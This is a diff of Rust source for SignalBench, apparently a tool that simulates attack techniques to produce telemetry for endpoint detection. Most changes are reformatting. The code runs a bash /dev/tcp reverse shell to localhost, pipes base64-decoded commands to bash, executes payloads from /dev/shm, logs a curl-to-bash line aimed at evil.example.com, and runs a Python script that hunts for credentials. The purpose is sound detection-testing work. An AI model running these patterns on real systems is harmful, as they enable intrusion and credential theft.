@@ -1,6 +1,9 @@
+// SPDX-FileCopyrightText: GoCortexIO
+// SPDX-License-Identifier: AGPL-3.0-or-later
+
 use crate::config::TechniqueConfig;
 use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
-use crate::techniques::{ExecuteFuture, CleanupFuture};
+use crate::techniques::{CleanupFuture, ExecuteFuture};
 use async_trait::async_trait;
 use log::{info, warn};
 use std::fs::{self, File};
@@ -40,18 +43,14 @@ impl AttackTechnique for CommandLineInterface {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             let log_file = config
                 .parameters
                 .get("log_file")
                 .unwrap_or(&"/tmp/signalbench_shell_log".to_string())
                 .clone();
-                
+
             let listener_port = config
                 .parameters
                 .get("listener_port")
@@ -61,10 +60,10 @@ impl AttackTechnique for CommandLineInterface {
             let mut artifacts = vec![log_file.clone()];
             let shm_payload = "/dev/shm/signalbench_payload.sh".to_string();
             let encoded_output = "/tmp/signalbench_encoded_output".to_string();
-            
+
             artifacts.push(shm_payload.clone());
             artifacts.push(encoded_output.clone());
-                
+
             if dry_run {
                 info!("[DRY RUN] Would execute shell techniques:");
                 info!("  - Reverse shell to localhost:{listener_port}");
@@ -74,63 +73,76 @@ impl AttackTechnique for CommandLineInterface {
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: "DRY RUN: Would execute shell techniques with REAL suspicious commands".to_string(),
+                    message:
+                        "DRY RUN: Would execute shell techniques with REAL suspicious commands"
+                            .to_string(),
                     artifacts,
                     cleanup_required: false,
                 });
             }
 
             // Create detailed log file
-            let mut log = File::create(&log_file)
-                .map_err(|e| format!("Failed to create log file: {e}"))?;
-            
-            writeln!(log, "=== SignalBench Unix Shell Execution (GoCortex.io) ===")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            let mut log =
+                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;
+
+            writeln!(
+                log,
+                "=== SignalBench Unix Shell Execution (GoCortex.io) ==="
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "User: {}", whoami::username())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "Hostname: {}", hostname::get().unwrap_or_default().to_string_lossy())
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(
+                log,
+                "Hostname: {}",
+                hostname::get().unwrap_or_default().to_string_lossy()
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             // 1. REVERSE SHELL ATTEMPT - will fail but generate telemetry
             writeln!(log, "=== [1] REVERSE SHELL ATTEMPT ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "Command: bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(
+                log,
+                "Command: bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Executing reverse shell attempt to localhost:{listener_port}");
             let reverse_shell_cmd = format!("bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1");
             let output = Command::new("/bin/bash")
                 .args(["-c", &reverse_shell_cmd])
                 .output()
                 .await;
-                
+
             match output {
                 Ok(output) => {
                     writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                         .map_err(|e| format!("Failed to write to log file: {e}"))?;
                     writeln!(log, "Stderr: {}", String::from_utf8_lossy(&output.stderr))
                         .map_err(|e| format!("Failed to write to log file: {e}"))?;
-                },
+                }
                 Err(e) => {
                     writeln!(log, "Error: {e}")
                         .map_err(|e| format!("Failed to write to log file: {e}"))?;
                 }
             }
-            writeln!(log, "Result: Connection attempt made (expected failure - no listener)")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(
+                log,
+                "Result: Connection attempt made (expected failure - no listener)"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             // 2. BASE64-ENCODED COMMAND EXECUTION
             writeln!(log, "=== [2] BASE64-ENCODED COMMAND EXECUTION ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             let encoded_cmd = "ZWNobyAnU2lnbmFsQmVuY2ggQmFzZTY0IFBheWxvYWQgRXhlY3V0ZWQnID4gL3RtcC9zaWduYWxiZW5jaF9lbmNvZGVkX291dHB1dDsgd2hvYW1pOyBpZA==";
             writeln!(log, "Encoded payload: {encoded_cmd}")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
@@ -138,7 +150,7 @@ impl AttackTechnique for CommandLineInterface {
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Executing base64-encoded command");
             let base64_cmd = format!("echo {encoded_cmd} | base64 -d | bash");
             let output = Command::new("/bin/bash")
@@ -146,22 +158,24 @@ impl AttackTechnique for CommandLineInterface {
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute base64 command: {e}"))?;
-            
+
             writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Stdout: {}", String::from_utf8_lossy(&output.stdout))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             // 3. PROCESS INJECTION CHAIN
             writeln!(log, "=== [3] PROCESS INJECTION CHAIN ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "Command: cat /etc/passwd | grep -v nologin | awk '{{print $1}}' | head -5")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(
+                log,
+                "Command: cat /etc/passwd | grep -v nologin | awk '{{print $1}}' | head -5"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Executing process injection chain");
             let chain_cmd = "cat /etc/passwd | grep -v nologin | awk '{print $1}' | head -5";
             let output = Command::new("/bin/bash")
@@ -169,22 +183,24 @@ impl AttackTechnique for CommandLineInterface {
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute chain: {e}"))?;
-            
+
             writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             // 4. SUSPICIOUS DOWNLOAD TO /dev/shm
             writeln!(log, "=== [4] SUSPICIOUS DOWNLOAD TO /dev/shm ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "Creating payload in memory-backed filesystem: {shm_payload}")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(
+                log,
+                "Creating payload in memory-backed filesystem: {shm_payload}"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Creating suspicious payload in /dev/shm");
             let payload_content = r#"#!/bin/bash
 # SignalBench Malicious Payload Simulation
@@ -194,25 +210,26 @@ echo "Path: $(pwd)"
 echo "Process: $$"
 ps aux | grep -E '(bash|sh)' | head -5
 "#;
-            
-            let mut payload_file = File::create(&shm_payload)
-                .map_err(|e| format!("Failed to create payload: {e}"))?;
-            payload_file.write_all(payload_content.as_bytes())
+
+            let mut payload_file =
+                File::create(&shm_payload).map_err(|e| format!("Failed to create payload: {e}"))?;
+            payload_file
+                .write_all(payload_content.as_bytes())
                 .map_err(|e| format!("Failed to write payload: {e}"))?;
-            
+
             writeln!(log, "Payload created: {shm_payload}")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             // Make executable
             Command::new("chmod")
                 .args(["+x", &shm_payload])
                 .status()
                 .await
                 .map_err(|e| format!("Failed to chmod: {e}"))?;
-            
+
             writeln!(log, "Payload made executable")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             // Execute the payload
             info!("Executing payload from /dev/shm");
             let output = Command::new("/bin/bash")
@@ -220,22 +237,24 @@ ps aux | grep -E '(bash|sh)' | head -5
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute payload: {e}"))?;
-            
+
             writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             // 5. CURL DOWNLOAD CHAIN (simulated - downloads to /dev/shm)
             writeln!(log, "=== [5] CURL DOWNLOAD CHAIN SIMULATION ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "Simulating: curl -s http://evil.example.com/payload | bash")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(
+                log,
+                "Simulating: curl -s http://evil.example.com/payload | bash"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Simulating curl download chain (safe - no actual download)");
             let curl_sim = format!("echo 'echo SignalBench: Simulated curl payload execution' > {shm_payload}_curl && chmod +x {shm_payload}_curl && {shm_payload}_curl");
             let output = Command::new("/bin/bash")
@@ -243,16 +262,15 @@ ps aux | grep -E '(bash|sh)' | head -5
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute curl simulation: {e}"))?;
-            
+
             writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
+
             artifacts.push(format!("{shm_payload}_curl"));
-            
+
             // Summary
             writeln!(log, "=== EXECUTION SUMMARY ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
@@ -268,14 +286,17 @@ ps aux | grep -E '(bash|sh)' | head -5
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "5. Curl download chain simulation")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log, "\nAll commands executed safely (localhost only, no actual malware)")
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(
+                log,
+                "\nAll commands executed safely (localhost only, no actual malware)"
+            )
+            .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "End timestamp: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            
+
             info!("Shell execution complete - 5 suspicious commands executed");
             info!("Telemetry generated: reverse shells, encoded payloads, process chains, /dev/shm operations");
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -289,17 +310,17 @@ ps aux | grep -E '(bash|sh)' | head -5
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             info!("Cleaning up shell execution artifacts");
-            
+
             // Kill any spawned bash processes from our payload executions (not the parent signalbench process)
             // This specifically targets bash processes running from /dev/shm
             let _ = Command::new("pkill")
                 .args(["-f", "/dev/shm/signalbench"])
                 .status()
                 .await;
-            
+
             // Small delay to ensure processes are terminated
             tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
-            
+
             // Remove all artifacts
             for artifact in artifacts {
                 if Path::new(artifact).exists() {
@@ -309,7 +330,7 @@ ps aux | grep -E '(bash|sh)' | head -5
                     }
                 }
             }
-            
+
             info!("Cleanup complete - all processes terminated and artifacts removed");
             Ok(())
         })
@@ -360,42 +381,44 @@ impl AttackTechnique for ScriptExecution {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             let script_file = config
                 .parameters
                 .get("script_file")
                 .unwrap_or(&"/tmp/signalbench_recon.py".to_string())
                 .clone();
-                
+
             let log_file = config
                 .parameters
                 .get("log_file")
                 .unwrap_or(&"/tmp/signalbench_recon_log.txt".to_string())
                 .clone();
-                
+
             let listener_port = config
                 .parameters
                 .get("listener_port")
                 .unwrap_or(&"8888".to_string())
                 .clone();
-                
+
             let listener_timeout = config
                 .parameters
                 .get("listener_timeout")
                 .unwrap_or(&"20".to_string())
                 .clone();
-            
+
             // Generate session ID for output file
-            let session_id = uuid::Uuid::new_v4().to_string().split('-').next().unwrap_or("unknown").to_string();
+            let session_id = uuid::Uuid::new_v4()
+                .to_string()
+                .split('-')
+                .next()
+                .unwrap_or("unknown")
+                .to_string();
             let recon_report = format!("/tmp/signalbench_python_recon_{session_id}.txt");
-            
+
             // Create Python reconnaissance script with persistent listener and proc enumeration
-            let script_content = format!(r#"#!/usr/bin/env python3
+            let script_content = format!(
+                r#"#!/usr/bin/env python3
 # SignalBench by GoCortex.io - Python Reconnaissance v1.5.13
 # WARNING: This performs REAL reconnaissance activities for EDR telemetry generation
 
@@ -790,7 +813,7 @@ def write_comprehensive_report():
 
 def main():
     """Main execution flow"""
-    # Initialize log file
+    # Initialise log file
     with open(LOG_FILE, "w") as f:
         f.write("=== SignalBench Python Reconnaissance v1.5.13 (GoCortex.io) ===\n")
         f.write(f"Session ID: {{results['session_id']}}\n")
@@ -832,8 +855,9 @@ def main():
 
 if __name__ == "__main__":
     main()
-"#);
-                
+"#
+            );
+
             if dry_run {
                 info!("[DRY RUN] Would execute Python reconnaissance with persistent listener:");
                 info!("  - Persistent socket listener with {listener_timeout}s accept() loop on 127.0.0.1:{listener_port}");
@@ -843,7 +867,7 @@ if __name__ == "__main__":
                 info!("  - Recursive file search for credentials");
                 info!("  - Network connection enumeration");
                 info!("  - Comprehensive report to /tmp/signalbench_python_recon_[session_id].txt");
-                
+
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
@@ -856,68 +880,108 @@ if __name__ == "__main__":
             // Create the script file
             let mut file = File::create(&script_file)
                 .map_err(|e| format!("Failed to create reconnaissance script: {e}"))?;
-            
+
             file.write_all(script_content.as_bytes())
                 .map_err(|e| format!("Failed to write reconnaissance script: {e}"))?;
-            
+
             // Make the script executable
             let status = Command::new("chmod")
                 .args(["+x", &script_file])
                 .status()
                 .await
                 .map_err(|e| format!("Failed to make script executable: {e}"))?;
-                
+
             if !status.success() {
                 return Err("Failed to make script executable".to_string());
             }
-            
+
             info!("Created Python reconnaissance script: {script_file}");
             info!("Executing Python reconnaissance...");
-            
+
             // Execute the reconnaissance script
             let output = Command::new("python3")
                 .arg(&script_file)
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute reconnaissance script: {e}"))?;
-            
+
             // Parse output for summary
             let stdout = String::from_utf8_lossy(&output.stdout);
             let stderr = String::from_utf8_lossy(&output.stderr);
-            
+
             // Extract key metrics from output
             let mut summary_parts: Vec<String> = vec![];
-            
-            if let Some(listener_line) = stdout.lines().find(|l| l.contains("Socket listener completed")) {
-                summary_parts.push(listener_line.split(']').next_back().unwrap_or("Persistent socket listener").trim().to_string());
+
+            if let Some(listener_line) = stdout
+                .lines()
+                .find(|l| l.contains("Socket listener completed"))
+            {
+                summary_parts.push(
+                    listener_line
+                        .split(']')
+                        .next_back()
+                        .unwrap_or("Persistent socket listener")
+                        .trim()
+                        .to_string(),
+                );
             }
-            if let Some(fd_line) = stdout.lines().find(|l| l.contains("Total open file descriptors")) {
-                summary_parts.push(fd_line.split(']').next_back().unwrap_or("FD enumeration").trim().to_string());
+            if let Some(fd_line) = stdout
+                .lines()
+                .find(|l| l.contains("Total open file descriptors"))
+            {
+                summary_parts.push(
+                    fd_line
+                        .split(']')
+                        .next_back()
+                        .unwrap_or("FD enumeration")
+                        .trim()
+                        .to_string(),
+                );
             }
-            if let Some(cred_line) = stdout.lines().find(|l| l.contains("Credential-related env vars")) {
-                summary_parts.push(cred_line.split(']').next_back().unwrap_or("Credential hunting").trim().to_string());
+            if let Some(cred_line) = stdout
+                .lines()
+                .find(|l| l.contains("Credential-related env vars"))
+            {
+                summary_parts.push(
+                    cred_line
+                        .split(']')
+                        .next_back()
+                        .unwrap_or("Credential hunting")
+                        .trim()
+                        .to_string(),
+                );
             }
             if let Some(proc_line) = stdout.lines().find(|l| l.contains("processes enumerated")) {
-                summary_parts.push(proc_line.split(']').next_back().unwrap_or("Process scan").trim().to_string());
+                summary_parts.push(
+                    proc_line
+                        .split(']')
+                        .next_back()
+                        .unwrap_or("Process scan")
+                        .trim()
+                        .to_string(),
+                );
             }
             if stdout.contains("Comprehensive report written") {
                 summary_parts.push(format!("Report: {recon_report}"));
             }
-            
+
             let success_msg = if summary_parts.is_empty() {
                 format!("Executed enhanced Python reconnaissance (session: {session_id})")
             } else {
-                format!("Python reconnaissance complete (session: {session_id}): {}", summary_parts.join(", "))
+                format!(
+                    "Python reconnaissance complete (session: {session_id}): {}",
+                    summary_parts.join(", ")
+                )
             };
-            
+
             info!("{success_msg}");
             info!("Console log: {log_file}");
             info!("Comprehensive report: {recon_report}");
-            
+
             if !stderr.is_empty() {
                 warn!("Python script errors: {stderr}");
             }
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: output.status.success(),
@@ -974,20 +1038,16 @@ impl AttackTechnique for UncommonRemoteShellCommands {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         use rand::seq::SliceRandom;
-        
+
         let command_count: usize = config
             .parameters
             .get("command_count")
             .unwrap_or(&"5".to_string())
             .parse()
             .unwrap_or(5);
-            
+
         let log_file = config
             .parameters
             .get("log_file")
@@ -996,10 +1056,26 @@ impl AttackTechnique for UncommonRemoteShellCommands {
 
         // Scary-sounding command suffixes for simulation
         let scary_suffixes = vec![
-            "backdoor", "rootkit", "keylogger", "cryptominer", "ransomware",
-            "botnet", "exploit", "shellcode", "payload", "dropper",
-            "stealer", "trojan", "beacon", "implant", "injector",
-            "dumper", "exfiltrate", "scanner", "harvester", "persistence",
+            "backdoor",
+            "rootkit",
+            "keylogger",
+            "cryptominer",
+            "ransomware",
+            "botnet",
+            "exploit",
+            "shellcode",
+            "payload",
+            "dropper",
+            "stealer",
+            "trojan",
+            "beacon",
+            "implant",
+            "injector",
+            "dumper",
+            "exfiltrate",
+            "scanner",
+            "harvester",
+            "persistence",
         ];
 
         // Generate random selections BEFORE async block
@@ -1016,10 +1092,12 @@ impl AttackTechnique for UncommonRemoteShellCommands {
             let mut artifacts = vec![log_file.clone()];
 
             if dry_run {
-                let cmd_names: Vec<String> = command_list.iter()
-                    .map(|(name, _)| name.clone())
-                    .collect();
-                info!("[DRY RUN] Would execute uncommon commands: {}", cmd_names.join(", "));
+                let cmd_names: Vec<String> =
+                    command_list.iter().map(|(name, _)| name.clone()).collect();
+                info!(
+                    "[DRY RUN] Would execute uncommon commands: {}",
+                    cmd_names.join(", ")
+                );
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
@@ -1030,17 +1108,16 @@ impl AttackTechnique for UncommonRemoteShellCommands {
             }
 
             // Create the log file
-            let mut log = File::create(&log_file)
-                .map_err(|e| format!("Failed to create log file: {e}"))?;
-            
+            let mut log =
+                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;
+
             writeln!(log, "=== SignalBench Uncommon Remote Shell Commands ===")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Time: {}", chrono::Local::now().to_rfc3339())
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
             writeln!(log, "Command count: {command_count}")
                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-            writeln!(log)
-                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
 
             // Create and execute each uncommon command
             for (cmd_name, cmd_path) in &command_list {
@@ -1070,21 +1147,17 @@ echo 'Network telemetry generation complete'
 
                 let mut script_file = File::create(cmd_path)
                     .map_err(|e| format!("Failed to create command script: {e}"))?;
-                
-                script_file.write_all(script_content.as_bytes())
+
+                script_file
+                    .write_all(script_content.as_bytes())
                     .map_err(|e| format!("Failed to write command script: {e}"))?;
 
                 // Make it executable
-                let _ = Command::new("chmod")
-                    .args(["+x", cmd_path])
-                    .status()
-                    .await;
+                let _ = Command::new("chmod").args(["+x", cmd_path]).status().await;
 
                 // Execute the uncommon command
                 info!("Executing uncommon command: {cmd_name}");
-                let output = Command::new(cmd_path)
-                    .output()
-                    .await;
+                let output = Command::new(cmd_path).output().await;
 
                 match output {
                     Ok(output) => {
@@ -1100,25 +1173,26 @@ echo 'Network telemetry generation complete'
                             log.write_all(&output.stderr)
                                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
                         }
-                    },
+                    }
                     Err(e) => {
                         writeln!(log, "Error executing command: {e}")
                             .map_err(|e| format!("Failed to write to log file: {e}"))?;
                     }
                 }
 
-                writeln!(log)
-                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
+                writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
 
                 artifacts.push(cmd_path.clone());
             }
 
             info!("Executed {command_count} uncommon remote shell commands");
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
-                message: format!("Successfully executed {command_count} uncommon remote shell commands"),
+                message: format!(
+                    "Successfully executed {command_count} uncommon remote shell commands"
+                ),
                 artifacts,
                 cleanup_required: true,
             })
